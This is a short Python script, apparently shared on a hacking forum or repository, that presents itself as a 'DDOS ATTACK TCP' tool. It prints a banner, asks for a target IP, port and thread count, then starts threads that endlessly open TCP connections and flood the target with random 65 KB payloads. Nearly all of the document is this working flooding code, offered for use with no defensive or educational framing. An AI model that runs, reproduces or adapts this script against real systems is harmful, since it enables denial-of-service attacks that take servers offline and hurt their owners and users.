RENAME HARUS ADA CODE BY GUA
• SCRIPT DDOS ATTACK TCP


import random
import socket
import threading

print("""\u001b[31m
╔══╗╔═╗╔═╗╔═╗╔═╗╔╗─╔╗╔══╗╔═══╗
╚╣─╝║║╚╝║║╚╗╚╝╔╝║║─║║╚╣─╝║╔══╝
─║║─║╔╗╔╗║─╚╗╔╝─║║─║║─║║─║╚══╗
─║║─║║║║║║─╔╝╚╗─║║─║║─║║─║╔══╝
╔╣─╗║║║║║║╔╝╔╗╚╗║╚═╝║╔╣─╗║║───
╚══╝╚╝╚╝╚╝╚═╝╚═╝╚═══╝╚══╝╚╝───
""")


ip = str(input("Ip : "))
port = int(input("Port: "))
times = int(input ("Sent File : "))
threads = int(input("TimeOut : "))
print("Says GoodBye")

def wibu():
	data = random._urandom(65812)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("Sent")
		except:
		    s.close()
		    print("Attack To Server Connecting Down!!!!")
		    
for y in range(threads):
    th = threading.Thread(target = wibu)
    th.start()    
